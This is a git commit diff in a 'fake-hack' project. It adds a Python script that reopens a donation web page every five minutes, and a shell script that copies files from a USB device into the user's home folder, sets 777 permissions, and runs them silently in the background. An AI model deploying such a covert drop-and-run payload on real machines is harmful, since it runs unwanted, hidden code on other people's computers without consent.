3cb7465d43aa5e83173b38b8253c8ad8900010ef
vuillaume <vitalvuillaume@proton.me>
2025-04-14 21:02:15 +0200

    hack

---
+++ fake-hack/app.py
@@ -0,0 +1,9 @@
+import time
+import webbrowser
+
+url = "https://rmbi.ch/vital/donation"
+
+
+while True:
+    time.sleep(300)
+    webbrowser.open(url)
--- fake-hack/exemple.sh
+++ fake-hack/exemple.sh
@@ -1,9 +1,11 @@
 #!/bin/bash
 
 cp ../../media/$USER/HACKYPI/exemple2.sh /home/$USER/
+cp ../../media/$USER/HACKYPI/app.py /home/$USER/
+
 
 chmod 777 exemple2.sh
 
-./exemple2.sh > /dev/null 2>&1 &
 
-python3 ../../media/$USER/HACKYPI/app.py > /dev/null 2>&1 &
+./exemple2.sh > /dev/null 2>&1 &
+python3 app.py > /dev/null 2>&1 &
